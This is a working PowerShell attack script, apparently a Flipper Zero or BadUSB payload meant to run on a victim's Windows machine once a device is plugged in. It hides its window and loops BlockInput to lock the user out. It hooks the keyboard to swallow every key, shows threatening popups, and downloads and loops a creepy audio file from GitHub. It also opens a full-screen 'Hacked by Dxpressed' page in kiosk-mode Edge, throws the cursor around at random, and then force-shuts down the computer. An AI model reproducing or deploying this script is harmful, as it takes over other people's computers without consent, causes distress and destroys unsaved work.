# Hide PowerShell window
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$hWnd = [Win32]::GetForegroundWindow()
[Win32]::ShowWindow($hWnd, 0)

# 🔒 BLOCK INPUT (with loop)
Start-Job {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class InputBlocker {
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    }
"@
    while ($true) {
        [InputBlocker]::BlockInput($true)
        Start-Sleep -Milliseconds 500
    }
}

# ⛔ DISABLE ALT+F4, CTRL, WIN, ETC
Start-Job {
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class KeyboardBlocker {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void SetHook() {
        _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
    }

    public static void Unhook() {
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        return (IntPtr)1; // Block all keys
    }

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@
[KeyboardBlocker]::SetHook()
Start-Sleep -Seconds 300
[KeyboardBlocker]::Unhook()
}

# 🪦 Creepy popup
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")

# 🔊 Play creepy audio
Add-Type -TypeDefinition @"
using System.Media;
public class Audio {
    public static void Play(string url) {
        System.Net.WebClient web = new System.Net.WebClient();
        string temp = System.IO.Path.GetTempFileName() + ".wav";
        web.DownloadFile(url, temp);
        SoundPlayer player = new SoundPlayer(temp);
        player.PlayLooping();
    }
}
"@
[Audio]::Play("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.wav")

# 🧟 Glitchy screen
$html = @"
<html>
<head>
  <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      background: black;
      color: red;
      font-family: 'Creepster', cursive;
      height: 100%;
      background: url('https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/creepy.jpg') no-repeat center center fixed;
      background-size: cover;
      animation: bgShake 0.2s infinite;
    }

    .text-container {
      text-align: center;
      margin-top: 8%;
      animation: pulseRed 2s infinite;
    }

    h1 {
      font-size: 100px;
      margin: 0;
      text-shadow: 0 0 20px red, 0 0 40px darkred;
      animation: glitchText 1s infinite;
    }

    h2 {
      font-size: 40px;
      animation: flicker 2s infinite;
    }

    .drip {
      color: crimson;
      position: relative;
      display: inline-block;
      animation: bloodDrip 3s infinite;
    }

    @keyframes flicker {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    @keyframes pulseRed {
      0% { text-shadow: 0 0 10px red; }
      50% { text-shadow: 0 0 40px red; }
      100% { text-shadow: 0 0 10px red; }
    }

    @keyframes glitchText {
      0% { transform: scale(1) rotate(0deg); }
      25% { transform: scale(1.02) rotate(1deg); }
      50% { transform: scale(0.98) rotate(-1deg); }
      75% { transform: scale(1.01) rotate(1deg); }
      100% { transform: scale(1) rotate(0deg); }
    }

    @keyframes bgShake {
      0% { background-position: center center; }
      25% { background-position: center left; }
      50% { background-position: center center; }
      75% { background-position: center right; }
      100% { background-position: center center; }
    }

    @keyframes bloodDrip {
      0% { transform: translateY(0); }
      100% { transform: translateY(15px); opacity: 0; }
    }

    /* Random ghost messages */
    .ghost-msg {
      position: absolute;
      color: rgba(255, 0, 0, 0.4);
      font-size: 20px;
      animation: floatGhost 10s infinite;
    }

    @keyframes floatGhost {
      0% { top: 100%; left: 50%; opacity: 0; }
      50% { top: 50%; opacity: 0.4; }
      100% { top: 0%; opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="text-container">
    <h1 class="drip">☠️</h1>
    <h2 class="drip">Your soul is mine.</h2>
    <h2 class="drip">You shouldn’t have summoned me.</h2>
    <h2 class="drip">Hacked by Dxpressed</h2>
  </div>

  <!-- Ghost messages -->
  <div class="ghost-msg" style="left: 10%;">I see you...</div>
  <div class="ghost-msg" style="left: 60%;">Run while you can</div>
  <div class="ghost-msg" style="left: 30%;">Too late now</div>

  <!-- Mouse ghost trail -->
  <script>
    document.addEventListener("mousemove", function(e) {
      let ghost = document.createElement("div");
      ghost.className = "ghost-msg";
      ghost.style.left = e.pageX + "px";
      ghost.style.top = e.pageY + "px";
      ghost.innerText = "👁️";
      document.body.appendChild(ghost);
      setTimeout(() => ghost.remove(), 1000);
    });
  </script>
</body>
</html>
"@

# Display the crash screen
$bsodFile = "$env:TEMP\bsod.html"
$html | Out-File $bsodFile -Encoding ASCII
Start-Process "msedge.exe" -ArgumentList "--kiosk", $bsodFile

# 🌀 Mouse glitch
Start-Job {
  Add-Type -AssemblyName System.Windows.Forms
  for ($i = 0; $i -lt 100; $i++) {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
    Start-Sleep -Milliseconds 200
  }
}

# 🕓 Wait and shut down
Start-Sleep -Seconds 240
Stop-Computer -Force
